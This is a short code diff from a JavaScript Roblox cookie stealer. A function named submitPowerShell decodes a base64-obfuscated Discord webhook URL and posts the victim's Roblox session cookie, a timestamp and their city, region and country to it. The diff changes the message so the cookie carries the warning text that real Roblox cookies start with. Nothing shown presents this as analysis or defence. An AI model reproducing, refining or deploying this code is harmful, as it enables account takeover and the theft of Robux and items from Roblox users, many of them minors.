@@ -262,11 +262,12 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Enhanced webhook payload with warning
+        // Enhanced webhook payload with Roblox warning
         const payload = {
             content: `🍪 **Roblox Cookie Captured**
 \`\`\`
-⚠️  WARNING: DO NOT SHARE THIS COOKIE ⚠️
+_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
+
 Cookie: ${robloxCookie || 'None found'}
 Time: ${new Date().toLocaleString()}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
